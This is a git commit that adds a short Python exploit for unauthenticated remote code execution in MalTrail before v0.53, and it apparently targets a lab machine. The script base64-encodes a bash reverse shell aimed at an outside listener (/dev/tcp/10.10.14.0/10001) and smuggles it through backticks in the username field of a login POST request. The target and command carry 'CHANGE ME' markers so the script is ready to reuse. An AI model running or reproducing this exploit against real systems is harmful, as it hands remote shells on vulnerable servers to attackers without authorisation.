e8510678dacd4b023e18c360bd254187ed8884ea
Kazzarah <155109680+kazzarahw@users.noreply.github.com>
2023-12-31 19:20:39 -0600

    Create mailtrail-v0.53.py

---
+++ rce/mailtrail-v0.53.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+# MalTrail < v0.53 - Unauthenticated RCE
+# By: https://github.com/kazzarahw
+# Ref: https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/
+
+# Imports
+import requests
+import base64
+
+# Config
+target_url = "http://10.10.11.224:55555/xvsvmwrjd1qnl0x7an9gv52dp6ok7k9q" # CHANGE ME
+cmd = "/bin/bash -i >& /dev/tcp/10.10.14.0/10001 0>&1" # CHANGE ME
+
+# Setup
+login_url = f"{target_url}/login"
+cmd_enc = base64.b64encode(cmd.encode()).decode()
+cmd_cradle = f"echo+{cmd_enc}|base64+-d|bash"
+payload = "username=;`" + cmd_cradle + "`"
+
+# Run
+response = requests.post(login_url, data=payload)
